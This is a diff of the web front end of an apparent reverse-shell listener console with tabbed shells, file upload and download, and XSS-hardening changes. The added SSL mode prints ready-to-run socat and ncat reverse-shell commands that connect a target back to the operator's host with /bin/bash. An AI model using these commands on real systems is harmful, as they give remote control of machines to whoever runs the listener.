@@ -1,172 +1,34 @@
-
-<style>
-  #shells-wrapper {
-    display: flex;
-    height: 80vh;
-    width: 100%;
-    font-family: monospace;
-    background: #111;
-    color: #0f0;
-    box-sizing: border-box;
-    overflow: hidden;
-  }
-
-  #shell-controls {
-    width: 20%;
-    min-width: 220px;
-    padding: 10px;
-    background: #222;
-    border-right: 1px solid #444;
-    box-sizing: border-box;
-  }
-
-  #shell-area {
-    flex: 1;
-    padding: 20px;
-    box-sizing: border-box;
-    display: flex;
-    flex-direction: column;
-  }
-
-  #shell-tabs {
-    display: flex;
-    margin-bottom: 10px;
-  }
-
-  .tab {
-    padding: 10px 15px;
-    cursor: pointer;
-    background: #333;
-    color: #0f0;
-    margin-right: 5px;
-    font-size: 14px;
-    border: none;
-  }
-
-  .tab.active {
-    background: #0f0;
-    color: #111;
-  }
-
-  .close-btn {
-    color: #111;
-    margin-left: 8px;
-    cursor: pointer;
-  }
-
-  #shell-output {
-    flex: 1;
-    background: #000;
-    border: 1px solid #444;
-    padding: 10px;
-    margin-bottom: 10px;
-    overflow-y: auto;
-    white-space: pre-wrap;
-  }
-
-  #shell-input {
-    background: #333;
-    border: none;
-    color: #0f0;
-    padding: 10px;
-    font-size: 14px;
-    width: 100%;
-    box-sizing: border-box;
-  }
-
-  select, input, button {
-    background: #333;
-    border: none;
-    font-family: monospace;
-    margin: 5px 0;
-    padding: 5px 10px;
-    box-sizing: border-box;
-  }
-
-  .message-info {
-    color: red;
-    display: block;
-  }
-
-  .message-output {
-    color: white;
-    display: block;
-  }
-
-  .btn-blue {
-    color: #00f;
-  }
-
-  .btn-yellow {
-    color: #ff0;
-  }
-
-  button {
-    cursor: pointer;
-  }
-
-  #download-popup {
-    background: #222;
-    color: #0f0;
-    border: 2px solid #444;
-    padding: 15px;
-    position: absolute;
-    top: 30%;
-    left: 35%;
-    z-index: 999;
-    display: none;
-    min-width: 300px;
-    resize: both;
-    overflow: auto;
-  }
-
-  #download-popup h3 {
-    border-bottom: 1px solid #555;
-    margin-bottom: 10px;
-    padding-bottom: 5px;
-    cursor: move;
-  }
-
-  .popup-listing div {
-    margin: 3px 0;
-    cursor: pointer;
-  }
-
-  .popup-actions {
-    margin-top: 15px;
-    display: flex;
-    justify-content: space-between;
-  }
-
-  .popup-actions button {
-    color: #0f0;
-  }
-</style>
+<!-- styles in /static/style.css -->
 
 
 <div id="shells-wrapper">
   <div id="shell-controls">
     <label for="listener-ip">IP:</label>
-    <select id="listener-ip" style="width: 150px;" class="ip-select"></select>
+    <input type="text" id="listener-ip" list="listener-ip-list" placeholder="192.168.1.1" autocomplete="off">
+    <datalist id="listener-ip-list"></datalist>
 
     <label for="listener-port">Port:</label>
-    <input type="number" style="width: 80px;" id="listener-port" placeholder="4444" value="4444">
+    <input type="number" id="listener-port" placeholder="4444" value="4444">
 
-    <div style="display: flex; justify-content: center; gap: 10px; margin-top: 10px;">
-      <button id="start-listener">Start Listener</button>
-      <button id="stop-listener">Stop Listener</button>
-    </div>
+    <label for="listener-mode">Mode:</label>
+    <select id="listener-mode">
+      <option value="tcp">TCP (nc, bash, socat, python, ps)</option>
+      <option value="ssl">SSL/TLS (socat OPENSSL, ncat --ssl)</option>
+    </select>
 
-    <div style="display: flex; justify-content: center; gap: 10px; margin-top: 10px;">
-      <button id="upload-btn" class="btn-blue">Upload</button>
-      <button id="download-btn" class="btn-yellow">Download</button>
+    <button id="start-listener" class="btn" style="width:100%;margin-top:10px;">Start Listener</button>
+    <button id="stop-listener" class="btn" style="width:100%;margin-top:4px;">Stop Listener</button>
+
+    <div style="display:flex;gap:6px;margin-top:10px;">
+      <button id="upload-btn" class="btn" style="flex:1;">Upload</button>
+      <button id="download-btn" class="btn" style="flex:1;">Download</button>
     </div>
   </div>
 
   <div id="shell-area">
     <div id="shell-tabs">
       <button class="tab active" data-tab="0" onclick="switchTab(0)">shell <span class="close-btn" onclick="closeTab(0)">&times;</span></button>
-      <button id="add-tab">+</button>
+      <button id="add-tab" class="btn btn-sm" style="display:none;">+</button>
     </div>
 
     <div id="shell-output"></div>
@@ -178,8 +40,8 @@
   <h3>Explorador remoto</h3>
   <div id="remote-file-list" class="popup-listing"></div>
   <div class="popup-actions">
-    <button onclick="cancelDownload()">Cancelar</button>
-    <button onclick="performDownloadSelection()">Descargar</button>
+    <button class="btn" onclick="cancelDownload()">Cancelar</button>
+    <button class="btn btn-primary" onclick="performDownloadSelection()">Descargar</button>
   </div>
 </div>
 
@@ -221,23 +83,26 @@ function persistShells() {
 
 
 function makePopupDraggable(popup) {
-  let isDragging = false;
   let offsetX = 0, offsetY = 0;
 
   const header = popup.querySelector('h3');
-  header.addEventListener('mousedown', (e) => {
-    isDragging = true;
+
+  function drag(e) {
+    popup.style.left = (e.clientX - offsetX) + 'px';
+    popup.style.top = (e.clientY - offsetY) + 'px';
+  }
+
+  function stopDrag() {
+    document.removeEventListener('mousemove', drag);
+    document.removeEventListener('mouseup', stopDrag);
+  }
+
+  header.addEventListener('mousedown', function(e) {
     offsetX = e.clientX - popup.offsetLeft;
     offsetY = e.clientY - popup.offsetTop;
     document.addEventListener('mousemove', drag);
-    document.addEventListener('mouseup', () => isDragging = false);
+    document.addEventListener('mouseup', stopDrag);
   });
-
-  function drag(e) {
-    if (!isDragging) return;
-    popup.style.left = `${e.clientX - offsetX}px`;
-    popup.style.top = `${e.clientY - offsetY}px`;
-  }
 }
 
 makePopupDraggable(document.getElementById('download-popup'));
@@ -257,9 +122,23 @@ function appendOutput(text, isInfo = false) {
 }
 
 function updateTabTitles() {
+  // Tab labels show port when a listener is active. Port value is sanitized
+  // to prevent DOM XSS from tampered localStorage data.
   document.querySelectorAll('.tab').forEach((tab, idx) => {
     if (!tab.id || tab.id !== 'add-tab') {
-      tab.innerHTML = `shell <span class="close-btn" onclick="closeTab(${idx})">&times;</span>`;
+      var rawPort = shells[idx] && shells[idx].port ? String(shells[idx].port) : '';
+      var safePort = rawPort.replace(/[^0-9]/g, '');
+      var shellMode = shells[idx] && shells[idx].mode === 'ssl' ? ' SSL' : '';
+      var label = safePort ? 'shell:' + safePort + shellMode : 'shell';
+      // Build DOM nodes instead of innerHTML to avoid XSS
+      while (tab.firstChild) tab.removeChild(tab.firstChild);
+      tab.appendChild(document.createTextNode(label + ' '));
+      var closeSpan = document.createElement('span');
+      closeSpan.className = 'close-btn';
+      closeSpan.textContent = '\u00d7';
+      closeSpan.setAttribute('data-idx', idx);
+      closeSpan.onclick = function(e) { e.stopPropagation(); closeTab(parseInt(this.getAttribute('data-idx'))); };
+      tab.appendChild(closeSpan);
       tab.classList.toggle('active', idx === currentTab);
       tab.setAttribute('onclick', `switchTab(${idx})`);
     }
@@ -269,8 +148,16 @@ function updateTabTitles() {
 function switchTab(index) {
   currentTab = index;
   const output = document.getElementById('shell-output');
-  output.innerHTML = '';
-  shells[currentTab].output.split("\n").forEach(line => line && appendOutput(line, line.startsWith('[INFO]') || line.startsWith('[ERROR]')));
+  while (output.firstChild) output.removeChild(output.firstChild);
+  // Render stored output without re-appending to shells data
+  shells[currentTab].output.split("\n").forEach(function(line) {
+    if (!line) return;
+    var span = document.createElement('span');
+    span.textContent = line + "\n";
+    span.className = (line.startsWith('[INFO]') || line.startsWith('[ERROR]')) ? 'message-info' : 'message-output';
+    output.appendChild(span);
+  });
+  output.scrollTop = output.scrollHeight;
   updateTabTitles();
 }
 
@@ -292,7 +179,13 @@ function createNewTab() {
   const index = shells.length;
   const tabButton = document.createElement('button');
   tabButton.classList.add('tab');
-  tabButton.innerHTML = `shell <span class="close-btn" onclick="closeTab(${index})">&times;</span>`;
+  tabButton.appendChild(document.createTextNode('shell '));
+  var closeSpan = document.createElement('span');
+  closeSpan.className = 'close-btn';
+  closeSpan.textContent = '\u00d7';
+  closeSpan.setAttribute('data-idx', index);
+  closeSpan.onclick = function(e) { e.stopPropagation(); closeTab(parseInt(this.getAttribute('data-idx'))); };
+  tabButton.appendChild(closeSpan);
   tabButton.setAttribute('onclick', `switchTab(${index})`);
   tabButton.dataset.tab = index;
 
@@ -305,15 +198,55 @@ function createNewTab() {
 document.getElementById('add-tab').onclick = createNewTab;
 
 document.getElementById('start-listener').onclick = () => {
-  const port = document.getElementById('listener-port').value;
+  const port = document.getElementById('listener-port').value.replace(/[^0-9]/g, '');
   if (!port) return alert("Enter a port.");
 
-  appendOutput(`[INFO] Listening on port ${port}`, true);
-  fetch(`/start_listener/${port}`)
+  // Check if port is already used by another tab
+  var existingIdx = shells.findIndex(function(s) { return s.port == port; });
+  if (existingIdx !== -1) {
+    appendOutput(`[ERROR] Port ${port} already in use (tab ${existingIdx + 1})`, true);
+    return;
+  }
+
+  // If current tab already has a listener, create a new tab
+  if (shells[currentTab].port) {
+    createNewTab();
+  }
+
+  var mode = document.getElementById('listener-mode').value;
+
+  // Set port immediately (fetch blocks until a connection arrives)
+  shells[currentTab].port = port;
+  shells[currentTab].mode = mode;
+  updateTabTitles();
+  persistShells();
+
+  var modeLabel = mode === 'ssl' ? 'SSL' : 'TCP';
+  appendOutput(`[INFO] Listening on port ${port} (${modeLabel})...`, true);
+  if (mode === 'ssl') {
+    var lip = document.getElementById('listener-ip').value;
+    appendOutput('[INFO] Connect from target (pick one):', true);
+    appendOutput('  socat OPENSSL:' + lip + ':' + port + ',verify=0 EXEC:/bin/bash', false);
+    appendOutput('  socat OPENSSL:' + lip + ':' + port + ",verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", false);
+    appendOutput('  ncat --ssl ' + lip + ' ' + port + ' -e /bin/bash', false);
+  }
+  fetch(`/start_listener/${port}?mode=${mode}`)
     .then(res => res.json())
     .then(data => {
-      shells[currentTab].port = port;
-      appendOutput(`[INFO] Shell received`, true);
+      if (data.error) {
+        appendOutput(`[ERROR] ${data.error}`, true);
+        // Revert port on error
+        shells[currentTab].port = null;
+        updateTabTitles();
+        persistShells();
+        return;
+      }
+      appendOutput(`[INFO] Shell received on port ${port}`, true);
+    })
+    .catch(function() {
+      appendOutput(`[ERROR] Failed to start listener on port ${port}`, true);
+      shells[currentTab].port = null;
+      updateTabTitles();
       persistShells();
     });
 };
@@ -374,7 +307,13 @@ document.getElementById('shell-input').addEventListener('keypress', e => {
   for (let i = 1; i < shells.length; i++) {
     const tabButton = document.createElement('button');
     tabButton.classList.add('tab');
-    tabButton.innerHTML = `shell <span class="close-btn" onclick="closeTab(${i})">&times;</span>`;
+    tabButton.appendChild(document.createTextNode('shell '));
+    var cs = document.createElement('span');
+    cs.className = 'close-btn';
+    cs.textContent = '\u00d7';
+    cs.setAttribute('data-idx', i);
+    cs.onclick = function(e) { e.stopPropagation(); closeTab(parseInt(this.getAttribute('data-idx'))); };
+    tabButton.appendChild(cs);
     tabButton.setAttribute('onclick', `switchTab(${i})`);
     tabButton.dataset.tab = i;
     tabs.insertBefore(tabButton, document.getElementById('add-tab'));
@@ -387,44 +326,30 @@ async function loadShellIps() {
   const res = await fetch('/ips');
   if (!res.ok) return;
 
-  const text = await res.text();
   try {
-    const ips = JSON.parse(text);
-    const select = document.getElementById('listener-ip');
+    const ips = await res.json();
+    const list = document.getElementById('listener-ip-list');
+    const input = document.getElementById('listener-ip');
     const portInput = document.getElementById('listener-port');
-
-    select.innerHTML = "";
 
     for (const ip of ips) {
       const opt = document.createElement('option');
       opt.value = ip;
-      opt.textContent = ip;
-      select.appendChild(opt);
+      list.appendChild(opt);
     }
 
-    // Restaurar IP si estaba guardada
+    // Restore saved values or use first IP
     const savedIp = localStorage.getItem('selected-ip');
-    if (savedIp && ips.includes(savedIp)) {
-      select.value = savedIp;
-    }
+    input.value = (savedIp && ips.includes(savedIp)) ? savedIp : (ips[0] || '');
 
-    // Restaurar puerto si estaba guardado
     const savedPort = localStorage.getItem('selected-port');
-    if (savedPort) {
-      portInput.value = savedPort;
-    }
+    if (savedPort) portInput.value = savedPort;
 
-    // Guardar cambios
-    select.addEventListener('change', () => {
-      localStorage.setItem('selected-ip', select.value);
-    });
-
-    portInput.addEventListener('input', () => {
-      localStorage.setItem('selected-port', portInput.value);
-    });
+    input.addEventListener('change', () => localStorage.setItem('selected-ip', input.value));
+    portInput.addEventListener('input', () => localStorage.setItem('selected-port', portInput.value));
 
   } catch (e) {
-    console.error("Failed to parse JSON:", text);
+    console.error("Failed to load IPs:", e);
   }
 }
 
@@ -552,21 +477,8 @@ function performDownloadSelection() {
 
 
 async function initShells() {
-  const res = await fetch('/ips');
-  const ips = await res.json();
-  const select = document.getElementById('shell-ip');
-  for (const ip of ips) {
-    const option = document.createElement('option');
-    option.value = ip;
-    option.textContent = ip;
-    select.appendChild(option);
-  }
+  // IPs are already loaded by loadShellIps() — nothing extra needed here
 }
-
-
-document.addEventListener('DOMContentLoaded', () => {
-  initShells();
-});
 
 
 
